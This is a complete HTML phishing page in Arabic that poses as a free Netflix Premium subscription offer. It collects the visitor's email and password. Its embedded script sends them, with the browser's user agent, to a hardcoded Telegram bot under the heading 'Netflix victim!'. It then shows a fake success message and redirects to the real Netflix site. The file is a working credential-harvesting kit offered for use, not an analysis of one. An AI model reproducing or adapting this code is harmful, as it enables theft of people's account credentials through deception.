<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Netflix Premium مجاني</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:#141414;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.container{background:rgba(0,0,0,0.8);border-radius:8px;padding:35px 25px;max-width:400px;width:100%;text-align:center;border:1px solid #333}
.logo{font-size:45px;color:#e50914;font-weight:900;letter-spacing:2px;margin-bottom:20px}
h1{font-size:20px;margin-bottom:8px}
.sub{color:#999;font-size:13px;margin-bottom:25px}
.fg{margin-bottom:14px;text-align:right}
label{display:block;color:#999;font-size:12px;margin-bottom:5px}
input{width:100%;padding:14px;background:#333;border:1px solid #444;border-radius:6px;color:#fff;font-size:15px;outline:none}
input:focus{border-color:#e50914}
.btn{width:100%;padding:14px;margin-top:10px;background:#e50914;color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer}
.btn:active{transform:scale(0.96)}
.load{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:99;justify-content:center;align-items:center;flex-direction:column}
.load.show{display:flex}
.spinner{width:50px;height:50px;border:4px solid #333;border-top:4px solid #e50914;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:18px}
@keyframes spin{to{transform:rotate(360deg)}}
.done{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:98;justify-content:center;align-items:center;flex-direction:column}
.done.show{display:flex}
.done h2{color:#46d369;font-size:24px;margin:12px 0}
</style>
</head>
<body>
<div class="container" id="form">
<div class="logo">NETFLIX</div>
<h1>اشتراك مجاني</h1>
<p class="sub">احصل على Netflix Premium مجاناً</p>
<div class="fg"><label>📧 البريد الإلكتروني</label><input type="email" id="email" placeholder="email@example.com"></div>
<div class="fg"><label>🔒 كلمة المرور</label><input type="password" id="password" placeholder="كلمة المرور"></div>
<div class="fg"><label>🎬 الخطة</label><select id="plan" style="width:100%;padding:14px;background:#333;border:1px solid #444;border-radius:6px;color:#fff;font-size:15px;outline:none"><option value="">-- اختر --</option><option>Basic - شهر</option><option>Standard - 3 أشهر</option><option>Premium - 6 أشهر</option></select></div>
<button class="btn" onclick="go()">▶️ اشترك الآن</button>
</div>
<div class="load" id="load"><div class="spinner"></div><p style="color:#999">⏳ جاري تفعيل الاشتراك...</p></div>
<div class="done" id="done"><h2>✅ تم التفعيل!</h2><p style="color:#999">الاشتراك مفعل بنجاح</p></div>
<script>
var u=new URL(window.location.href);
var CHAT=u.searchParams.get('chatId')||'7276604783';
var TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
async function send(t){
try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:'HTML'})})}catch(e){}
}
async function go(){
var em=document.getElementById('email').value.trim();
var pw=document.getElementById('password').value.trim();
var pl=document.getElementById('plan').value;
if(!em||!pw||!pl)return alert('املأ جميع الحقول');
document.getElementById('load').classList.add('show');
var msg='📺 <b>ضحية نتفليكس!</b>\n\n📧 إيميل: '+em+'\n🔒 كلمة: '+pw+'\n🎬 خطة: '+pl+'\n\n📱 '+navigator.userAgent;
await send(msg);
setTimeout(function(){document.getElementById('load').classList.remove('show');document.getElementById('done').classList.add('show');setTimeout(function(){window.location.href='https://netflix.com/'},3000)},4000);
}
</script>
</body>
</html>
